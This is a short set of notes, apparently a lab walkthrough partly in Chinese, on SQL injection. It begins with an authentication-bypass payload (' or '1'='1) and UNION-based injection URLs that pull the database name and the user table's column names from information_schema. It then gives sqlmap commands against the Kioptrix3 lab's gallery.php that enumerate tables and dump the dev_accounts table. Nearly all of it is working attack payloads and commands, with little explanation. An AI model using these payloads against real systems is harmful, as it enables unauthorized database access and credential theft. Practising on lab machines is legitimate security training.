pass = '' or '1' = '1';
' or '1' = '1



`http://localhost/wzry/url.php?date=20231012' union`

`SELECT database(),'','','`

`http://localhost/wzry/url.php?date=20231012' union`

`SELECT`

`(select GROUP_CONCAT(c.COLUMN_NAME )from information_schema.COLUMNS c where`

`c.TABLE_SCHEMA='game' and c.TABLE_NAME='user'),'','','`


通过exploit database搜索得知，gallarific的gallery.php页面存在sql注入漏洞
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --dbs
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --tables



sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --search -D gallery -T gallarific_users
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --search -D gallery -T dev_accounts


获得gallery数据库下的表名:sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1 -p id --level 4 --risk 3 -D gallery --tables --batch
获取dev_accounts表的数据：sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1 -p id --level 4 --risk 3 -D gallery -T dev_accounts --dump --batch





